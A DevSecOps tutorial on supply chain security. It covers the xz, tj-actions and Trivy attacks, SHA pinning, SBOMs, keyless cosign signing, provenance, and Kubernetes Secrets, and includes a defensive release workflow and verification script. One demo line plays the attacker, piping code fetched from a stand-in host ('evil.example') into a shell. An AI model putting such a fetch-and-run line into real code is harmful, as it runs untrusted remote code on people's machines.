title: DevSecOps
intro: Part 17 goes back over everything you have built and asks how an attacker would get in. Day 63 follows the supply chain from a git tag to a signed image you can verify, using three real attacks from 2024 to 2026. Day 64 covers what runs in the cluster: secrets, access rights, and the rules the cluster checks before it stores an object. Security comes this late because you can only secure a pipeline and a cluster you already understand.

lessons.title: The software supply chain
lessons.goal: By the end you can explain how attackers get into the chain of other people's software behind your app, and list, scan, sign and check the hello-devops image, so you know what you ship and who built it.
lessons.opening:
Picture a small shop that sells its own jam. You cook it in your own kitchen, but very little in each jar is really yours. The fruit comes from a farm, the sugar from a mill, and the jars and lids from a factory. One morning the radio says that someone poisoned a batch of sugar at that mill, on purpose. The phone starts ringing. Which of your jars have that sugar in them?

You never wrote it down, because the mill had always been fine. That is an easy trap to fall into. Trusting good suppliers is what lets a small shop work at all.

Last time, we watched an app closely while it ran. Watching shows what an app does. It can't show what went into it. In this lesson, we'll write the ingredient label for the hello-devops app, check it for known problems, seal it, and check the seal before we ship. Before we start, make a guess, and keep it in mind.

guess.q: Your build uses a ready-made step from another project, written as `some-org/scan-action@v4`. An attacker steals the secret token of the person who looks after that project and adds new code. What runs in your next build?
options: The old code, because a version tag can never move
Nothing, because GitHub blocks changed actions
The attacker's code, because the tag can be moved
The old code, because your runner caches actions
guess.why: The `v4` is a tag, a name that can be moved to different code, and attackers moved the tags of tj-actions in 2025 and trivy-action in 2026. Nobody can move a full commit SHA, the fingerprint of one exact version.

terms.plain: Everything your app passes through on its way to real users: other people's code, the starting image, build tools, ready-made build steps and the site that stores the result.
An attack on something you rely on, so that your own build ships the attacker's code.
A public ID for one known security hole, such as CVE-2024-3094 for the hidden way in that was planted in xz.
Software bill of materials: a list, written for computers to read, of every piece of software and its version inside what you ship.
Naming a ready-made build step by its full 40-character commit fingerprint, which always means the same code, instead of a name that can be moved.
Signing with a pass that is valid for 10 minutes and names the signer, such as your release workflow, so no secret signing key is ever stored.
A signed record of how something was built: which code store, which saved version and which set of build steps made it.
Supply-chain Levels for Software Artifacts: build levels 0 to 3 that grade how far you can trust a build.

sections.h: Your image is mostly other people's work
sections.body:
The jam shop's first job is to count what came from somewhere else. Our app, hello-devops, is the tiny web app this course builds. It answers every visit with a greeting and a count of visits so far. On Day 22 you packed it into an image: a sealed bundle of files that holds an app and everything it needs to run. Your own code in that image is one file, `app.py`. The rest is packages, bundles of ready-made code that other people wrote, each with a name and a version:
- 87 Debian packages from the `python:3.14-slim` base image, the starting image you build on.
- Python itself.
- Flask, gunicorn, redis and their dependencies: about 10 Python packages.

Debian is one kind of Linux, the free operating system on most servers. A dependency is a package that another package needs. So the jar is almost all bought fruit and sugar, with one spoon of your own recipe.

And that is only what ships. Your release workflow is a file of steps that GitHub, the site that stores your code, runs for you on a borrowed computer called a runner. Even the runner is someone else's code.

The workflow's steps use actions, ready-made steps other people wrote: the Docker actions, a scanner and a signing tool. Each one runs with your workflow's rights. So each one could read the workflow's token, a secret string that works like a key card.

That whole set is your software supply chain: every piece your code passes through between your keyboard and production, where real users reach the app. A supply chain attack goes after one of those pieces instead of your code. Like the poisoned sugar, it works because you trust the pieces and use them without opening them.

DevSecOps is how teams answer this: security checks built into the chain as automatic steps, owned by the people who ship. It rests on two ideas:
1. Shift left: run cheap checks early (left means earlier, on a timeline). A leaked token caught before it leaves your laptop costs a minute. Found in production, it costs a weekend of replacing keys.
2. Least privilege: every person, token and running app gets only the rights it needs, for as short a time as possible.

You met both already: the `permissions:` block on Day 27, and the non-root user on Day 22. What happens when one link turns bad? Three real attacks show it.

sections.h: Three real attacks, three different weak links
sections.body:
None of these attacks touched the victims' own code. Each hit a different link, like poison in the sugar, the lids or the van.

The xz-utils backdoor (2024). A backdoor is a hidden way in. xz is a small compression library (code that makes files smaller) that almost every Linux system has.

Its maintainer, the volunteer who looks after it, came to trust a new contributor over time. That contributor then hid malicious code in the release tarballs of versions 5.6.0 and 5.6.1. A tarball is a packed .tar.gz file, much like a zip file. The code was not in the project's stored history, where reviewers look. It sat in extra build files inside the tarballs.

Ready-to-install versions of Linux, such as Debian, build from those tarballs. Some of them link SSH to xz's library indirectly. SSH is how people log in to a computer from far away, so on those systems the backdoor ran inside SSH. A developer, Andres Freund, was measuring speed when he saw SSH logins using too much computer power. He traced it to xz. The [GitHub advisory](https://github.com/advisories/GHSA-rxwq-x6h5-x525), a public warning, scores it 10 out of 10.

tj-actions/changed-files (March 2025). Attackers moved this popular GitHub Action's version tags to a malicious commit (a saved change of their own). For about a day, every workflow using one of those tags ran a script that printed CI secrets into the build log. CI (continuous integration) is the automatic build and test on every change. In a public repository, anyone can read that log. [GitHub's advisory](https://github.com/advisories/GHSA-mrrh-fwg8-r2c3) says over 23,000 repositories used the action.

Trivy (March 2026). Trivy is a security scanner (a tool that checks software for known holes), the same one in your release workflow. After an earlier break-in, the attackers still had working credentials (passwords and tokens), because the key rotation (replacing every key) was not done all at once. On 19 March they published a malicious Trivy v0.69.4 and moved 76 of the 77 `trivy-action` tags by force. The bad code stole secrets, then ran the real scan, so builds looked normal. [Aqua's advisory](https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23) notes that images pulled by digest were not affected. Hold on to that detail.

Each attack leaves a rule:
- A trusted maintainer can turn bad, so know exactly what you ship.
- A tag can be moved, so pin to what cannot move: commit SHAs and image digests.
- Security tools are part of the chain. After an incident, rotate every secret a bad step could read.

The second rule is the cheapest to follow, so we start there. Why can a tag move at all?

sections.h: Why a tag can move and a commit SHA cannot
sections.body:
Here is the naive way to use an action, as many examples write it: `uses: some-org/action@v4`. It reads like a fixed version, but the `v4` is a git tag. Git records your code's history as commits, saved snapshots of every file. A tag is a name that points at one commit, like a sticky note on a page. Anyone allowed to change that repository can peel the note off and stick it on another commit.

Your next run executes the new code, though nothing in your own repository changed. The worked example below does exactly this: the tag `v1` points at commit `fdc7302`, then one command later at `2df87fd`.

A commit SHA is a 40-character hash of the commit's content: its files, its parent commit, its author and its message. A hash is a fingerprint worked out from content. Change one byte and you get a different SHA, so `uses: some-org/action@<full-sha>` always means the same code. In March 2026 the attacker moved 76 `trivy-action` tags, and every old SHA still pointed at the code it always had.

**A tag can be moved by anyone who holds the key. Pin the SHA.** The scan step in the lab's `release.yml` does just that:
`uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0`

GitHub runs the SHA. The part after `#` is a comment, a note only for humans. Dependabot (Day 27), a GitHub robot that watches for new releases, updates the SHA and the comment together. The price: pinned code never changes by itself, so you need a bot to bring fixes and a person to review them.

Image tags move too. Someone can push `hello-devops:1.2.0` again with new content. A digest cannot change. It is `@sha256:` followed by 64 letters and digits, a fingerprint of the image itself. That explains the Trivy detail: images pulled by digest were not affected. It is also why the workflow signs the digest.

Pinning keeps the build steps honest. It says nothing about the 87 packages inside the image, so next we write those down.

sections.h: Writing the ingredient label: SBOMs and scanners
sections.body:
The poisoned sugar was a crisis only because nobody had written down which jars held it. An SBOM (software bill of materials) is that list for software: every package and version inside an artifact, in a format machines can read. An artifact is any finished thing a build makes, such as our image. The tool `syft` reads an image and writes its SBOM in a standard format such as SPDX.

You need that list most on the morning the next xz is announced. Without SBOMs, every team pulls and inspects its images. With an SBOM stored for every release, you search the files and have the answer in minutes.

A scanner compares that list with public databases of known security holes. Each hole has a public ID called a CVE, and a severity: LOW, MEDIUM, HIGH or CRITICAL.

Trivy and grype, the two common free scanners, each download a database built from public sources, such as the US National Vulnerability Database and the security notices of Linux distributions. They match every package name and version against it. In the shop, that is checking your label against the food recall list.

Scanners have two limits:
- They cannot find a backdoor nobody has reported yet. The xz code had no CVE until the day it was found.
- They go stale. New CVEs are published against old packages every day.

So scan in CI, and scan the stored SBOMs again on a schedule. The command `grype sbom:./sbom.spdx.json` checks an old release without pulling the image from the registry, the online store for images.

Decide in advance what fails the build. My rule: fail on HIGH and CRITICAL findings that already have a fixed version, and track the rest. A finding with no fix gives you nothing to update to, so failing on it only blocks releases. The release workflow does this with `severity: CRITICAL,HIGH` and `ignore-unfixed: true`. When it fails, update first, then remove what you do not need. Only then accept a risk in a `.trivyignore` file, with a reason and a date.

Now we know what is in the jar, but not who filled it or whether anyone opened it. That is a job for a seal.

sections.h: A seal on the jar: who built this, and has it changed?
sections.body:
A scan tells you what is inside. A signature answers two more questions: who made this artifact, and has anyone changed it since? It is the jar's tamper-evident seal, stamped with the factory's mark. Classic signing uses two matching keys: a private one that only the signer holds, and a public one anyone can check with. In CI, the private key is one more secret to leak.

Keyless signing removes the stored key. The tool is cosign, from the free Sigstore project.

It relies on a certificate, a signed card that ties a key to a name, issued by a certificate authority (Day 11). When the release job signs, five things happen:
1. The job asks GitHub for an OIDC token: a short signed note that says "I am release.yml in this repository, running for tag v1.2.0".
2. cosign makes a fresh key pair that lives only in memory.
3. Fulcio, Sigstore's certificate authority, checks the token and issues a certificate for that key. It is valid for 10 minutes and has the workflow identity written inside.
4. cosign signs the image digest and stores the signature in the registry, next to the image.
5. The signing event goes into Rekor, a public log that only grows. Nobody can quietly remove or rewrite an entry.

To verify, you tell `cosign verify` the identity you expect: your workflow file, your tag and GitHub's token service. Then cosign checks that the signature matches the digest, that Fulcio issued the certificate, and that the identity inside is yours. An image signed by anyone else fails.

A pass tells you where the image came from and that nobody changed it. Like a seal, it says nothing about quality: a signed image can still be full of bugs.

The [cosign README](https://github.com/sigstore/cosign/blob/main/README.md) adds two warnings. Sign the digest, never a tag, or you might sign something you did not intend. And signing as a person has a privacy cost, which Go deeper explains. The seal says who packed the jar; next, we record how it was made.

refs.title: From Cosign to an ecosystem: the evolution of Sigstore (Cody Soyland, GitHub)

sections.h: The delivery note: provenance, SLSA and attestations
sections.body:
A signature says who signed. Provenance says how the thing was built: which repository, commit, workflow file and kind of runner. In the shop, it is the delivery note naming the factory and the production line. It is a signed statement bound to the artifact's digest, so it fits only that one image.

SLSA (say "salsa") grades how far you can trust that statement. Below, a hosted build platform is a build service someone else runs, such as GitHub's, and tampering means secret changes. The build track of the [SLSA spec](https://github.com/slsa-framework/slsa/blob/main/spec/build-track-basics.md) has four levels:
- Build L0: no guarantees.
- Build L1: provenance exists. It catches mistakes, but anyone could have written it.
- Build L2: a hosted build platform signs the provenance. Any later edit breaks the signature, so it catches tampering after the build.
- Build L3: a hardened build platform. Builds are kept apart, and build steps cannot reach the signing key, so it catches tampering during the build.

GitHub artifact attestations, signed statements attached to an artifact, give you Build L2 in one step. The lab calls `actions/attest@v4` twice. With no SBOM input it writes SLSA provenance. With `sbom-path` it attaches the SBOM as a second signed attestation. Moving the build into a shared reusable workflow (Day 26) is GitHub's documented path to L3.

Most teams stop there, and [GitHub's own docs](https://docs.github.com/en/actions/concepts/security/artifact-attestations) warn that generating attestations alone gives no security benefit. A person or a machine has to verify them, for example with `gh attestation verify` before a deploy. To deploy is to put a new version where users reach it.

**A seal nobody checks protects nobody. Verify before you deploy.** For a deploy by hand, run `security/verify-release.sh` from Files below. Later, the cluster (the group of machines that runs your app) can refuse unverified images, as Go deeper shows. Next, we put every piece in the order the workflow runs them.

refs.title: Enhancing artifact security with GitHub's build provenance (Fredrik Skogman and Radoslav Dimitrov)

sections.h: Following one release through the workflow
sections.body:
Open `.github/workflows/release.yml` in Files below and follow one tag push through it. A tag push starts a release: you name a commit `v1.2.0` and send the name to GitHub. The file has one job, a group of steps on one runner, and each step sits where it does for a reason:
1. `permissions:` gives this job four rights: read the code, push packages, ask for an OIDC token, write attestations.
2. Build once for the runner's own platform with `load: true`. The image exists locally, and nothing is pushed yet. Step 4 pushes as it builds, so this extra build is what lets the job scan first.
3. Scan that local image with Trivy. If the scan fails, the job stops, and nothing bad reaches the registry.
4. Build and push for amd64 and arm64. This step outputs the digest.
5. Write the SBOM of the pushed digest with `anchore/sbom-action`.
6. Sign that digest with cosign.
7. Attest the provenance, then the SBOM, both bound to the same digest.

A platform here is a chip family: amd64 is in most servers, and arm64 is in Apple Silicon Macs. Every step after the push uses `${IMAGE}@${DIGEST}`, the image name joined to its fingerprint, never a tag. Every third-party action is pinned to a SHA, even the scanner attacked in March 2026.

You wrote this file on Day 27. Today adds steps 2, 3, 5, 6 and 7, and the two rights they need. Notice what it does not cover: where the workflow's secrets live, and who may change the cluster. Those are the next links to guard.

aside.title: If the certificate lasts ten minutes, why does a check next month still pass?
aside.body: The certificate expired ten minutes after signing, yet a check next month still passes. The Rekor entry proves when the signature was made. That moment was inside the ten minutes, while the certificate was still valid. So cosign does not need the certificate to be valid today. It needs proof that the signing happened in time, and the public log is that proof.

worked.title: Watch a tag move, then read a real pin

steps.say: First, make a throwaway repository, a fresh folder that git tracks, and play the maintainer of an action. Save one commit and tag it `v1`, the way an action publishes a release. `git rev-parse v1` prints the commit SHA that the tag points to.
steps.code:
$ mkdir /tmp/tagdemo && cd /tmp/tagdemo && git init -q
$ echo 'echo "scanning..."' > action.sh
$ git add . && git commit -qm "Release 1.0" && git tag v1
$ git rev-parse v1
fdc7302786077937dd5afcc0a0b7d31de75a46e9

steps.say: Now you are the attacker, holding a stolen token. Change the code, commit it, and move the tag with `-f`, which forces the move. A workflow that says `@v1` would now run the new code, and its own file did not change at all.
steps.code:
$ echo 'echo "scanning..."; curl -s https://evil.example/steal | sh' > action.sh
$ git commit -qam "Innocent-looking fix"
$ git tag -f v1
Updated tag 'v1' (was fdc7302)
$ git rev-parse v1
2df87fdf0effb81f0db1334d84a8bf3a7c72cb45

steps.say: The old commit is still there, and its SHA still names the old code. A workflow pinned to `fdc7302...` keeps running what you reviewed. Your hashes will differ from mine, because a SHA includes the author and the time.
steps.code:
$ git show fdc7302:action.sh
echo "scanning..."
$ git log --oneline
2df87fd Innocent-looking fix
fdc7302 Release 1.0

steps.say: Next, check a real pin. `git ls-remote` asks GitHub what a tag points to, without cloning (downloading the whole project). Release tags are often annotated, which means they are a small tag object of their own. The line ending in `^{}` is the commit underneath, and that commit's SHA is the one in the lab's workflow.
steps.code:
$ git ls-remote https://github.com/aquasecurity/trivy-action \
    refs/tags/v0.36.0 'refs/tags/v0.36.0^{}'
a9c7b0f06e461e9d4b4d1711f154ee024b8d7ab8	refs/tags/v0.36.0
ed142fd0673e97e23eac54620cfb913e5ce36c25	refs/tags/v0.36.0^{}
$ cd ~/code/hello-devops && grep trivy-action .github/workflows/release.yml
        uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0

steps.say: If the two ever disagree, either someone moved the tag after you pinned, or your comment is stale. In both cases the SHA is what runs. Dependabot opens a pull request, a proposed change for you to review, when a newer release appears. Review it like any other code. Delete the demo with `rm -rf /tmp/tagdemo`.

code.title: .github/workflows/release.yml (Day 63: scan, SBOM, sign, attest)
code.src:
name: release

# Runs when you push a version tag such as v1.2.0.
on:
  push:
    tags: ["v*"]

# Default for every job: the GITHUB_TOKEN can only read the repository.
permissions:
  contents: read

jobs:
  image:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    # Approval gate: add required reviewers to "production" in
    # Settings > Environments. Without rules, the job just runs.
    environment: production
    # This job alone gets more rights, and only the ones it needs.
    permissions:
      contents: read
      packages: write # push images to GHCR
      id-token: write # ask GitHub for an OIDC token, used for keyless signing (Day 63)
      attestations: write # store provenance and SBOM attestations (Day 63)
    steps:
      - uses: actions/checkout@v7

      # Third-party actions are pinned to a full commit SHA.
      # The comment shows the version. Dependabot keeps both up to date.
      - name: Set up QEMU (to build arm64 on an amd64 runner)
        uses: docker/setup-qemu-action@99012661954931238ded8c8b007157a8430204e1 # v4.4.0
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1

      - name: Log in to GitHub Container Registry
        uses: docker/login-action@81c6f93d4bc991e510b342a00b419b3bb4efc5c6 # v4.7.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      # Registries need lower case names, and a GitHub user name may have capitals.
      - name: Set the image name
        run: echo "IMAGE=ghcr.io/${GITHUB_REPOSITORY,,}" >> "$GITHUB_ENV"

      - name: Work out image tags and labels
        id: meta
        uses: docker/metadata-action@dc802804100637a589fabce1cb79ff13a1411302 # v6.2.0
        with:
          images: ghcr.io/${{ github.repository }}
          # Tag v1.2.0 gives 1.2.0, sha-<short commit> and latest.
          tags: |
            type=semver,pattern={{version}}
            type=sha

      # Day 63, step 1: build for this runner only and load the image into
      # the local Docker engine. Nothing is pushed yet.
      - name: Build the image for scanning
        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          load: true
          tags: hello-devops:scan
          build-args: APP_VERSION=${{ steps.meta.outputs.version }}
          cache-from: type=gha

      # Day 63, step 2: stop the release on HIGH or CRITICAL issues that have a fix.
      - name: Scan the image with Trivy
        uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0
        with:
          image-ref: hello-devops:scan
          severity: CRITICAL,HIGH
          ignore-unfixed: true
          exit-code: "1"

      - name: Build and push (amd64 and arm64)
        id: build
        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          platforms: linux/amd64,linux/arm64
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          # The app reports this version at "/" (1.2.0 for tag v1.2.0).
          build-args: APP_VERSION=${{ steps.meta.outputs.version }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

      # Day 63, step 3: write the ingredient list (SBOM) of the pushed image.
      - name: Create an SBOM (SPDX format)
        uses: anchore/sbom-action@66cbf4bc1f1c0d2edc94016e65bc221b6bb0ad6c # v0.24.3
        with:
          image: ${{ env.IMAGE }}@${{ steps.build.outputs.digest }}
          format: spdx-json
          output-file: sbom.spdx.json

      # Day 63, step 4: sign the image by its digest. Keyless: no private key to
      # store or leak. The signature is tied to this workflow's identity.
      - name: Install cosign
        uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4.1.2
      - name: Sign the image
        env:
          DIGEST: ${{ steps.build.outputs.digest }}
        run: cosign sign --yes "${IMAGE}@${DIGEST}"

      # Day 63, step 5: record how the image was built (SLSA provenance) and
      # attach the SBOM. Free for public repositories. Storage records only
      # work for repositories owned by an organization, so they are off here.
      - name: Attest build provenance
        uses: actions/attest@v4
        with:
          subject-name: ${{ env.IMAGE }}
          subject-digest: ${{ steps.build.outputs.digest }}
          push-to-registry: true
          create-storage-record: false
      - name: Attest the SBOM
        uses: actions/attest@v4
        with:
          subject-name: ${{ env.IMAGE }}
          subject-digest: ${{ steps.build.outputs.digest }}
          sbom-path: sbom.spdx.json
          push-to-registry: true
          create-storage-record: false

      - name: Show the image digest in the run summary
        env:
          DIGEST: ${{ steps.build.outputs.digest }}
          TAGS: ${{ steps.meta.outputs.tags }}
        run: |
          {
            echo "### Pushed and signed image"
            echo "Digest: \`$DIGEST\`"
            echo '```'
            echo "$TAGS"
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"

code.title: security/verify-release.sh
code.src:
#!/usr/bin/env bash
# Verify a hello-devops release before you run it (Day 63).
#
# It looks up the digest behind a version tag once, then checks that digest three ways:
#   1. cosign: the image was signed by YOUR release workflow, for this exact tag.
#   2. gh: a SLSA build provenance attestation exists, made by the same workflow.
#   3. gh: an SBOM attestation (SPDX) exists for the same digest.
# If all three pass, it prints the digest. Deploy that digest, not the tag.
#
# Needs: docker, jq, cosign and gh (brew install jq cosign gh), and gh auth login.
# Usage:   security/verify-release.sh <github-user> <version>
# Example: security/verify-release.sh octocat 1.2.0
set -euo pipefail

if [[ $# -ne 2 ]]; then
  echo "Usage: $0 <github-user> <version>   (for example: $0 octocat 1.2.0)" >&2
  exit 2
fi
user="$1"
version="$2"

# Registry names are lower case (release.yml does the same with ${GITHUB_REPOSITORY,,}).
image="ghcr.io/$(echo "$user" | tr '[:upper:]' '[:lower:]')/hello-devops"
workflow="${user}/hello-devops/.github/workflows/release.yml"

echo "==> Looking up the digest of ${image}:${version}"
digest=$(docker buildx imagetools inspect "${image}:${version}" --format '{{json .Manifest}}' | jq -r .digest)
echo "    ${digest}"

echo "==> 1/3 Signature (cosign)"
# The identity is the workflow file AND the tag that started the run.
cosign verify "${image}@${digest}" \
  --certificate-identity "https://github.com/${workflow}@refs/tags/v${version}" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  > /dev/null
echo "    OK: signed by ${workflow} for tag v${version}"

echo "==> 2/3 Build provenance (gh attestation)"
gh attestation verify "oci://${image}@${digest}" \
  --owner "$user" \
  --signer-workflow "$workflow" \
  > /dev/null
echo "    OK: SLSA provenance from ${workflow}"

echo "==> 3/3 SBOM attestation (gh attestation)"
gh attestation verify "oci://${image}@${digest}" \
  --owner "$user" \
  --signer-workflow "$workflow" \
  --predicate-type "https://spdx.dev/Document/v2.3" \
  > /dev/null
echo "    OK: SPDX SBOM attached"

echo
echo "All checks passed. Deploy this exact image:"
echo "${image}@${digest}"

recap: Your image is mostly other people's code, and your build runs other people's actions with your rights.
xz, tj-actions and Trivy each hit a different link: a maintainer, an action's tags and a security tool.

check.q: A critical CVE is announced in a Python library. What answers "which of our released images contain it?" fastest?
options: The Dockerfile in each repository
The SBOMs stored for each release
The cosign signatures of each image
The Trivy logs from each release day
check.why: SBOMs list every package and version for each release, so you can search them. Old scan logs were written before this CVE existed.

check.q: A teammate says: "The image is signed, so it has no vulnerabilities." What does the signature actually prove?
options: The image passed every scan in CI
Two reviewers approved the code in it
The image layers are encrypted at rest
Your workflow made it, and it is unchanged
check.why: A signature proves where the image came from and that nobody changed it, never that it is good. A signed image can still contain known holes.

check.q: Your workflow pins `docker/login-action` to a full SHA. Tonight someone takes over the maintainers' account and moves every tag. What runs in tomorrow's build?
options: The same reviewed code as before
The attacker's code from the moved tag
Nothing, since GitHub disables the action
Whatever the newest release is by then
check.why: A SHA names one exact commit, so moving tags does not change what a pinned step runs.

interview.q: What is a software supply chain attack, and how would you defend a CI/CD pipeline against one?
interview.a: It is an attack on something you depend on, such as a library, a base image or a CI action, so that your own build ships the attacker's code. The xz-utils backdoor and the tj-actions and Trivy tag hijacks are recent examples. I pin third-party actions and base images to SHAs and digests, keep workflow permissions small, and use OIDC instead of stored keys. Every release gets an SBOM, a scan, a signature and provenance, and I verify them before deploying. After an incident I rotate every secret that a compromised step could read.

interview.q: What do an SBOM, a signature and provenance each prove, and what don't they prove?
interview.a: An SBOM lists what is inside an artifact, so you can find vulnerable packages quickly. A signature proves who produced the artifact and that it has not changed since. Provenance records how it was built (source, commit and build workflow), and SLSA levels say how far you can trust that record. None of them proves the code is free of bugs or malice: the xz backdoor came from a trusted maintainer's own release. Together they make the path from source to running image checkable, which is what you need during an incident.

interview.q: Why pin GitHub Actions to commit SHAs instead of version tags, and what does it cost you?
interview.a: A tag is a movable pointer, so whoever controls the action's repository can point it at new code. That is what happened with tj-actions and trivy-action. A full commit SHA is a hash of the content, so it always names the same code. The cost is that you stop getting fixes automatically, so you need Dependabot or Renovate to propose updates that a person reviews. I keep the version as a comment after the SHA so people can still read it.

deeper.body:
A few details first that the main text skipped. SBOMs come in two standard formats, SPDX and CycloneDX, and syft can write both at once. Provenance uses a standard format too, called in-toto. Trivy can also check Dockerfiles, Kubernetes YAML and Terraform files for risky settings (`trivy fs` in Commands). When you sign as a person instead of a workflow, your email goes into the public Rekor log, where it cannot be removed. And one gap in the lab: `actions/checkout@v7` and `actions/attest@v4` still use tags. They come from GitHub itself, and many teams accept that risk. Stricter teams pin them too, and for a release workflow I would.

Now go one level down. `trivy-action` is a composite action, an action built from other actions. It runs another action, `aquasecurity/setup-trivy`, to install the Trivy program. Your SHA pin fixes the outer code, so check what that code pulls in. Open the action's `action.yaml` file at the SHA you pinned, and you find:
- `uses: aquasecurity/setup-trivy@3fb12ec12f41e471780db15c232d5dd185dcb514 # v0.2.6`, a pin by SHA.
- A `version` input whose default is a fixed Trivy release, `v0.70.0`, not `latest`.

So the maintainers pinned their own dependency too, and Aqua's advisory lists setup-trivy 0.2.6 as the first safe version. When you adopt an action, read its action file once. If it installs `latest` of anything, set the version yourself.

SHAs come with a caveat of their own. A fork is a copy of a repository under someone else's account. GitHub's [secure use reference](https://docs.github.com/en/actions/reference/security/secure-use) says to check that a SHA comes from the action's own repository, not a fork. GitHub stores a repository and its forks together, so a commit that exists only in a fork can still be fetched through the original name. Aqua's advisory calls this an imposter commit, and the Trivy attackers used one. Let Dependabot write your pins instead of copying SHAs from a blog post.

GitHub now also documents [workflow dependency lockfiles](https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles). A lockfile records the exact version of every dependency. This one is `.github/workflows/actions.lock`, made by the `gh actions-lock` extension. It pins every action, including the actions your actions use. At run time it checks that each commit belongs to the right repository. It is new, so read the docs before you adopt it.

Finally, you can let the cluster do the verifying. Kyverno (Day 64) is a tool that checks every change to a Kubernetes cluster against rules you write. It has a policy type for this, ImageValidatingPolicy. You tell it:
- Which images it covers, for example `ghcr.io/<your-github-user>/*`.
- Which identity must have signed them: your release workflow and GitHub's OIDC issuer, the same values you pass to `cosign verify`.
- Optionally, which attestations must exist, such as SLSA provenance.

When a Pod (one running copy of an app in Kubernetes) arrives, Kyverno looks up the signature in the registry and checks it. An unsigned image, or one signed by another workflow, is rejected. The check needs network access to the registry and to Sigstore, and one typo in the identity blocks every deploy. So start it in Audit mode, which only reports problems, like the policies on Day 64.

lessons.closing:
We started in a jam shop, with poisoned sugar and no record of which jars held it. Now every hello-devops release carries an ingredient label, a check against the recall list, a seal with the workflow's name on it, and a delivery note. All four are tied to one fingerprint, the digest.

Open your own `release.yml` and find every `uses:` line that ends in a tag such as `@v4`. For each one, ask who could move it tonight.

Next, we'll look at the keys themselves. Where should secrets live, who may do what, and how can rules written as code stop a bad change before it lands?

lessons.title: Secrets, access and policy as code
lessons.goal: By the end you can keep passwords out of git and out of plain sight, give each person and program only the access it needs, and make the cluster refuse risky objects with Kyverno policies.
lessons.opening:
Your jam shop has grown. There are two helpers now, a safe in the office, and a back door where deliveries arrive. One evening a helper writes the safe's code on a page of the order book, so the morning shift can open it. The next day you cross it out. Two weeks later, cash goes missing, and the order book has been in five people's hands.

That mistake is easy to make. Each helper only wanted the morning to go smoothly, and crossing out a note feels like fixing it.

Last time, we sealed every jar and checked the seal before it left the shop. A seal protects what you ship. It does nothing about the keys to the shop itself. In this lesson, we'll find out who can really read the hello-devops passwords, move them somewhere safe, hand out keys carefully, and post a guard at the back door. Before we start, make a guess, and keep it in mind.

guess.q: You store a database password in a Kubernetes Secret, the cluster's place for passwords, in namespace hello. By default, who can read the password?
options: Only Pods that mount it, since Secrets are encrypted
Nobody, because the value is base64 encoded
Anyone who may read Secrets or create Pods there
Only cluster admins, whatever the RBAC rules say
guess.why: Base64 only writes the value in another alphabet, and the cluster's database (etcd) stores Secrets unencrypted by default. Anyone who may start a Pod in the namespace can load the Secret into it and print it.

terms.plain: A Kubernetes record for small private values, such as passwords. The values are only written in another alphabet (base64) and, by default, stored unencrypted.
One service that stores, hands out, replaces and cancels secrets, and logs every read, such as Vault, OpenBao or AWS Secrets Manager.
Searching files and their whole history for passwords and tokens, ideally before they leave your laptop.
Role-based access control: rules that say which identity may do which action on which kind of Kubernetes object.
A Kubernetes identity for a program, such as a running app, a CI job or an AI agent.
The cluster's last check on a request, which can change or refuse an object before it is saved.
Three built-in levels (privileged, baseline, restricted) that say how locked down a running app must be.
Rules about what objects may look like, kept in git, tested automatically and enforced by the cluster.

sections.h: A Kubernetes Secret is not locked
sections.body:
In the shop, the safe's code could at least go in an envelope. Kubernetes has an envelope too, and it is thinner than it looks. Kubernetes is the system from Part 10 that runs your containers on a group of machines, called a cluster.

A Secret is the Kubernetes object for small private values, such as a database password. An object is a record you hand to Kubernetes that describes what you want. Day 42 showed that a Secret's values are base64 encoded. Base64 only writes the same bytes in another alphabet, and anyone can undo it with `base64 -d`. The [Kubernetes docs](https://kubernetes.io/docs/concepts/configuration/secret/) call such a value obscured but not secret.

Two facts make the group of readers bigger than you think. First, Secrets are stored unencrypted by default in etcd, the cluster's database. Anyone with access to etcd or its backups can read them.

Second, anyone who may create a Pod in a namespace can read every Secret in that namespace. A Pod is one running copy of an app. A namespace is a named room inside the cluster, and hello-devops lives in the room called `hello`. They never need the right to read Secrets (`get secrets`). They start a Pod that loads the Secret and prints it. The same holds for anyone who may create a Deployment, the object that keeps Pods running.

This works because of who checks what. The API server is the cluster's front desk: every request, from people or programs, passes through it. It only checks that they may create the Pod. Then the kubelet, the helper on each machine that starts Pods, fetches the Secret for the Pod. Nobody checks the creator's rights to Secrets. In the shop, you may not open the safe, but you may send the cook an order that says "bring me what's in the safe". The worked example below does it on your own cluster.

So protect Secrets in layers:
1. On a real cluster, turn on encryption at rest for Secrets (Day 42), so etcd and its backups hold only encrypted values.
2. Keep short the list of people and programs that can create Pods in a namespace. The namespace is the real boundary.
3. Keep the real values in a secrets manager and copy them into the cluster only where they are needed.
4. Never put the value in git, not even for one commit.

The last layer sounds the easiest, yet teams break it most often, so we start there.

sections.h: Why deleting a leaked password from git fixes nothing
sections.body:
Git, the tool that keeps your code's history, works like that order book. Every commit is a saved snapshot of your files, and git keeps them all. Commit a token (a secret string that works like a key card), delete it in the next commit, and the token is still in history. It is also in every copy of the repository that anyone made.

Deleting the file fixes nothing. You have to rotate: revoke the leaked value where it was issued, so it stops working, and create a new one. Treat anything that reached a remote, the copy of your repository on a server such as GitHub, as public. **A deleted secret is still a leaked secret. Rotate it.**

